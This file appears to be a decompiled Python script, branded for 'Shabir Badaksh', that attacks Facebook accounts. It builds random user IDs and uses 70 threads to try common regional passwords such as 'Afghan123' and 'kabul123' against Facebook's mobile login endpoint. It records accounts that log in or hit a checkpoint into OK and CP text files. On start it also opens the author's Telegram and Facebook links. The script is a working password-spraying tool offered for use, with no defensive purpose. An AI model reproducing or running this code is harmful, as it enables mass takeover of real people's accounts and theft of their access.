       #In the name of allah that craet all world#
# Decompile by Mardis (Tools By RAUEES ARYAN)
# Time Succes decompile : 2023-02-07 00:26:14.084668
from os import path
import os,base64,zlib,pip,urllib
os.system('xdg-open http://Telegram.me/+730448475')
...
import uuid
import os,sys,time,json,random,re,string,platform,base64
os.system('xdg-open https://www.facebook.com/juma2323?mibextid=2JQ9oc')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
...
logo=("""
d8888b.  .d8b.  d8888b.  .d8b.  db   dD .d8888. db   db 
88  `8D d8' `8b 88  `8D d8' `8b 88 ,8P' 88'  YP 88   88 
88oooY' 88ooo88 88   88 88ooo88 88,8P   `8bo.   88ooo88 
88~~~b. 88~~~88 88   88 88~~~88 88`8b     `Y8b. 88~~~88 
88   8D 88   88 88  .8D 88   88 88 `88. db   8D 88   88 
Y8888P' YP   YP Y8888D' YP   YP YP   YD `8888Y' YP   YP                                                                                                              
  ─────────────────────────────────────────────────
  WELCOME TO SHABIR BADAKSH FREE TOOLS 🔥
  ─────────────────────────────────────────────────    
\33[1;37m----------------------------------------------
[×] →  Owner        :  RAYEES SHABIR BADAKSHAI 
[×] →  Facebook. :  SHABIR BADAKSH
[×] →  TELEGRAM.    : @Shabir_Hacker_001
[×] →  Tools          :  RANDOM 
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://Telegram.me/+93730448475text=SN.JAN💜🐰Sir😪💕')
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/juma2323');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def m2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'100200','10002000','Khan12345','khan123','Afghan123','Afghanistan','Afghan12345','kabul123','۱۲۳۴۵۶']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def rcrack(uid,pwx,tl):
    ...
    'referer': 'https://m.facebook.com/login/?email=gauzyuzux&li=Z23xZMX7LKSwfZE2MiSdj5hY&e=1348028&shbl=1&refsrc=deprecated&_rdr',
    'save-data': 'on',
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:114.0esr) Gecko/20002201 Firefox/114.0esr',
    'viewport-width': '980',}
            lo = session.post('https://m.facebook.com/login/devicc-based/regular/login/', params=params, cookies=cookies, headers=headers, data=data,).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[SHABIR-OK] '+cid+'|'+ps+'\033[0;97m')
                open('SHABIR-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SHABIR-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SHABIR-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
